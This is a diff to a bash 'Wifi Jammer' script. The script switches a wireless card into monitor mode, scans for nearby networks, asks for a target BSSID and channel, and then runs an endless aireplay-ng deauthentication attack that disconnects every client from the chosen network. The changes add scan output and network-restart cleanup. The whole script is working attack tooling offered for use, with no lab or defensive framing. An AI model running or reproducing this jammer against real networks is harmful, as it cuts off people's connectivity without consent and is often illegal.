@@ -33,6 +33,7 @@ echo -e ""
 airmon-ng &>/dev/null
 echo -e "$white Collecting Data...$nc"
 echo -e ""
+iwlist wlan0 scan | GREP_COLOR='01;36' egrep --color=always 'ESSID\|Address\|Channel'
 airmon-ng start wlan0 &>/dev/null
 airmon-ng check kill &>/dev/null
 echo -e "$white Checking And Killing Processes....$nc"
@@ -42,6 +43,8 @@ echo -e "$white Processes killed....$nc"
 echo -e ""
 sleep 1s
 #timeout --signal=SIGINT 5
+echo -e "If All the network is not Coming you can show in airodump Terminal"
+echo ""
 xterm -e airodump-ng wlan0mon &
 echo -e "$white in the lists $nc"$red XX:XX:XX:XX:XX:XX$nc" $white is your attack's BSSID$nc"
 echo -e ""
@@ -52,7 +55,17 @@ sleep 1s
 read -p $'\033[1;33m[*]Enter BSSID Here : \033[0m' bssid
 echo ""
 read -p $'\033[1;33m[*]Enter Attack CH (channel number) : \033[0m' ch
+if [ $bssid = "" ]; then
+airmon-ng stop wlan0mon &>/dev/null 
+service networking restart &>/dev/null &
+service network-manager restart &>/dev/null &
+fi
 
+if [ $ch = "" ]; then
+airmon-ng stop wlan0mon &>/dev/null 
+service networking restart &>/dev/null &
+service network-manager restart &>/dev/null &
+fi
 echo -e "$green Please Wait.... $nc" 
 xterm -e airodump-ng -c $ch --bssid $bssid wlan0mon &
 echo -e "_________________________________________________________"
@@ -73,8 +86,7 @@ echo -e "$green Wifi Jammer Is starting......$nc"
 xterm -hold -e aireplay-ng -0 0 -a $bssid wlan0mon 
 airmon-ng stop wlan0mon &>/dev/null 
 service networking restart &>/dev/null &
-service network-manager restart &>/dev/null &
-else echo"hy" 
+service network-manager restart &>/dev/null & 
 fi
 
 
@@ -256,4 +268,3 @@ service network-manager restart &>/dev/null &
 #airmon-ng stop wlan0
 #service networking restart
 #service network manager restart
-
